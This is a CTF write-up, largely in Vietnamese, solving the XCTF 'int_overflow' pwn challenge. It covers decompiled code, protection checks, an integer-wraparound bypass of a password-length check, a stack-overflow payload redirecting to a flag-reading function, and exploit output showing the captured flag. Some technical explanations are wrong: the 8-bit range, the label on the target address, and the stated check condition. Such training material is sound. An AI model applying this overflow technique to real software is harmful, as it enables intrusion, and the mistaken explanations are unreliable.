# XCTF - PWN Exercise - int_overflow

```c
#include<stdio.h>

int what_is_this()
{
  return system("cat flag");
}

char *__cdecl check_passwd(char *s)
{
  char dest[11]; // [esp+4h] [ebp-14h] BYREF
  unsigned __int8 v3; // [esp+Fh] [ebp-9h]

  v3 = strlen(s);
  if ( v3 <= 3u || v3 > 8u )
  {
    puts("Invalid Password");
    return (char *)fflush(stdout);
  }
  else
  {
    puts("Success");
    fflush(stdout);
    return strcpy(dest, s);
  }
}

int login()
{
  char buf[512]; // [esp+0h] [ebp-228h] BYREF
  char s[40]; // [esp+200h] [ebp-28h] BYREF

  memset(s, 0, 0x20u);
  memset(buf, 0, sizeof(buf));
  puts("Please input your username:");
  read(0, s, 0x19u);
  printf("Hello %s\n", s);
  puts("Please input your passwd:");
  read(0, buf, 0x199u);
  return check_passwd(buf);
}

int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v4; // [esp+Ch] [ebp-Ch] BYREF

  setbuf(stdin, 0);
  setbuf(stdout, 0);
  setbuf(stderr, 0);
  puts("---------------------");
  puts("~~ Welcome to CTF! ~~");
  puts("       1.Login       ");
  puts("       2.Exit        ");
  puts("---------------------");
  printf("Your choice:");
  __isoc99_scanf("%d", &v4);
  if ( v4 == 1 )
  {
    login();
  }
  else
  {
    if ( v4 == 2 )
    {
      puts("Bye~");
      exit(0);
    }
    puts("Invalid Choice!");
  }
  return 0;
}
```

Kiếm tra các flag secure trước.

```
l1j9m4 in ~/0_PWNable/ADworld_XCTF/Exersice/3_int_overflow λ checksec int_overflow
[*] '/home/l1j9m4/0_PWNable/ADworld_XCTF/Exersice/3_int_overflow/int_overflow'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

Xem qua tất cả các hàm chúng ta thấy có hàm `what_is_this()` thực thi đọc flag mà không có hàm nào gọi đến nó cả nên mục tiêu là ghi đè địa chỉ trả về của một hàm nào đó bằng địa chỉ của hàm `what_is_this()` (vì không có `Canary` nên ý tưởng ban đầu cơ bản là như vậy). Hàm `login()` cơ bản là nhập vào username và passwd sau đó passwd là đối số cho hàm `check_passwd(buf)`. Vấn đề nằm ở đây, vì vị trí của `username` và `passwd` trên stack được cấp phát khá lớn nên không thể cố nhập tràn rồi ghi đề return address nhưng ở hàm `check_passwd(buf)`, v3 là độ dài của `passwd` và nếu v3 thỏa mãn `v3 <= 3u || v3 > 8u` thì chuỗi `passwd` sẽ được coppy sang biến `dest[11]` nằm ở [ebp-14h] => có thể stack buffer overflow rồi ghi đè return address của hàm `check_passwd(buf)` do độ dài của buf[512] chính là `passwd`.

Bây giờ ta có payload = "A" * 0x18 + p32(0x804868b) - `0x804868b là địa chỉ của check_passwd(buf)` có độ dài là 28 > 8. Như vậy là không thỏa mãn check_passwd.

Bài này xuất hiện lỗ hổng `int overflow` hay là tràn số nguyên.

Biến v3 khai báo `unsigned __int8` nghĩa là có độ dài 8 bits. Các loại biến số nguyên khác nhau thì có phạm vi giá trị khác nhau, nếu giá trị chúng ta nhập vào nằm trong phạm vi hợp lý thì không sao, nhưng nếu giá trị nhập vào vượt quá phạm vi giá trị thì sẽ xảy ra hiện tượng tràn số nguyên. Máy tính sẽ đọc giá trị mặc định là phần sau của giá trị đầu vào. 

Ví dụ: giá trị của 8 bit int là `-255 ~ 255`. Nếu đầu vào 256, 255 tương ứng với nhị phân `1111 1111` và 256 tương ứng với nhị phân `1 0000 0000`. Khi máy tính gặp 256, nó sẽ mặc định ở phần sau, `0000 0000` vì vậy 256 sẽ được công nhận giống 0 và cứ như vậy 257 là 1, 258 là 2,...

Vậy như bài trên ta thấy giá trị `v3` thỏa mãn là `3 < v3 <= 8` tương ứng với `259 = 256 + 3 < v3 <= 256 + 8 = 264` (ở đây 256 được máy tính hiểu là số 0 do tràn số nguyên). 

Ta chọn v3 = 260, khi đó payload sẽ là `payload = "A" * 0x18 + p32(0x804868b) + "A" * 232`.

Tiến hành viết file [exploit.py](exploit.py) và khai thác:

```
l1j9m4 in ~/0_PWNable/ADworld_XCTF/Exersice/3_int_overflow λ python2 exploit.py 
[+] Opening connection to 111.200.241.244 on port 56460: Done
[+] Receiving all data: Done (53B)
[*] Closed connection to 111.200.241.244 port 56460
Success
cyberpeace{1677f09f699e94d2b65653d19ab2ddb5}

[*] Switching to interactive mode
[*] Got EOF while reading in interactive
$  
```
